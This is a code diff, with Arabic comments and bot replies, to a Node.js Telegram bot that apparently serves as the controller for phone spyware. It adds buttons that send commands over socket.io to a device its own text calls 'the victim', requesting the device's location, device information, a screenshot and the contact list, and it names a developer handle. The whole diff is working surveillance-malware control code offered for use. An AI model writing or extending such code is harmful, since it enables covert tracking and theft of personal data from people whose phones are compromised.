@@ -27,9 +27,30 @@ bot.on('message', (msg) => {
     if (!text || text === '/start') return;
     if (text === '⌖ عن لنا') return bot.sendMessage(chatId, '⌖ المطور: @king_1_4');
 
-    // إرسال الأمر للترماكس
-    io.emit('command', { action: text });
-    bot.sendMessage(chatId, `⏳ تم إرسال الأمر للضحية: ${text}...`);
+    // إرسال الأمر للترماكس (بالإنجليزي عشان الترماكس يفهمها)
+    if (text === '📍 الموقع') {
+        io.emit('command', { action: 'loc' });
+        bot.sendMessage(chatId, '⏳ جاري طلب الموقع...');
+        return;
+    }
+    
+    if (text === '📱 معلومات الجهاز') {
+        io.emit('command', { action: 'info' });
+        bot.sendMessage(chatId, '⏳ جاري طلب معلومات الجهاز...');
+        return;
+    }
+    
+    if (text === '📸 لقطة شاشة') {
+        io.emit('command', { action: 'shot' });
+        bot.sendMessage(chatId, '⏳ جاري التقاط الشاشة...');
+        return;
+    }
+    
+    if (text === '📇 جهات الاتصال') {
+        io.emit('command', { action: 'contacts' });
+        bot.sendMessage(chatId, '⏳ جاري سحب جهات الاتصال...');
+        return;
+    }
 });
 
 // استقبال البيانات من الترماكس
